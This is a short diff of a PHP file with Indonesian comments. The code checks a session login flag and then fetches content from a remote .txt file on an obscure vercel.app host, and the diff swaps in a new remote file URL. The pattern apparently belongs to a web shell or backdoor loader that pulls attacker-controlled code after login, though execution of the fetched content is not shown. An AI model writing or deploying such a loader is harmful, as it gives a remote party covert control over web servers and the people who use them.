@@ -39,7 +39,7 @@ function fetchContent($url) {
 
 // Jika sudah login, ambil konten dari URL
 if (isset($_SESSION['loggedin'])) {
-    $url = 'https://nhjeapinake.vercel.app/japetpunyabarang.txt';
+    $url = 'https://nhjeapinake.vercel.app/japadwukong.txt';
     $content = fetchContent($url);
 
     if ($content !== false) {
